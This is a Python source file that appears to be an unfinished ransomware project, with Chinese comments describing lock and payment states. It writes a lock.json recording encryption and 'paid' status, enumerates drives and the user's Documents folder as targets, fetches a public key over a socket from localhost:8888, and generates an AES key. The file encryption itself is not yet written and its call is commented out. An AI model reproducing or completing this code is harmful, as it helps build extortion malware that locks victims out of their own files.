import os
import json
import string
import random
import hashlib
import socket
import secrets
import datetime
#from mysocket import MySocket

__rmfolderPath = f"C:/Users/{os.getlogin()}/AppData/Local/bkms/"
testPath = "./data/"

class Mycrypto:
    def checkfile():
        rmfilePath = testPath + "lock.json"

        #0:沒檔案or未加密,1:有檔案未繳錢,2:有檔案已繳錢
        try:
            with open(rmfilePath,"r") as file:
                data = json.load(file)
                #print(json.dumps(data,indent=4))
                if(data["lock"] == 0):
                    return 0
                elif(data["lock"] == 1 and data["paid"] == 0):
                    return 1
                elif(data["lock"] == 1 and data["paid"] == 1):
                    return 2
        except FileNotFoundError:
            print("No found")
            return 0
    
    class __createFile:
        def __init__(self,path):
            self.path = path

        def checkfile(self,fileName,length=16):
            rmfilePath = self.path + "/" + fileName

            letters_and_digits = string.ascii_letters + string.digits
            random_string = ''.join(random.choice(letters_and_digits) for _ in range(length))
            id = hashlib.sha256(random_string.encode()).hexdigest()

            data = {
                "lock":1,
                "paid":0,
                "lockTime":datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "UID":id
                }
            with open(rmfilePath,"w") as file:
                json.dump(data,file,indent=4)

        def randomID(self,fileName,length=16):
            letters_and_digits = string.ascii_letters + string.digits
            random_string = ''.join(random.choice(letters_and_digits) for _ in range(length))
            id = hashlib.sha256(random_string.encode()).hexdigest()

            rmfilePath = self.path + "/" + fileName
            data = {
                "id":id
            }
            with open(rmfilePath,"w") as file:
                json.dump(data,file,indent=4)


def _getAvaiblableDrives():
    drives = []
    for letter in string.ascii_uppercase:
        drive = letter + ":/"
        if os.path.exists(drive):
            drives.append(drive)
    drives.remove("C:/")
    drives.append(f"C:/Users/{os.getlogin()}/Documents")
    return drives

def __Encryprion(path):
    def __getPublicKey():
        recevice = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        recevice.connect(("localhost",8888))
        publicKey = recevice.recv(4096)
        return publicKey
    
    def __generateAESKey(key_length=16):
        key = secrets.token_bytes(key_length)
        key = key.hex()
        return key

    encryptFilePath = []
    publicKey = __getPublicKey()
    aeskey = __generateAESKey(32)

    

def runEncryption():
    print("Encryption start")

    __cf = Mycrypto.__createFile(testPath)
    __cf.checkfile("lock.json")
    drives = _getAvaiblableDrives()
    print(drives)

    #__Encryprion(drives)
    


def rundeCryption():
    print("Decryption start")
    rmfilePath = testPath + "lock.json"
    
    with open(rmfilePath,"r") as file:
        data = json.load(file)
    data["paid"] = 1

    with open(rmfilePath,"w") as file:
        json.dump(data,file,indent=4)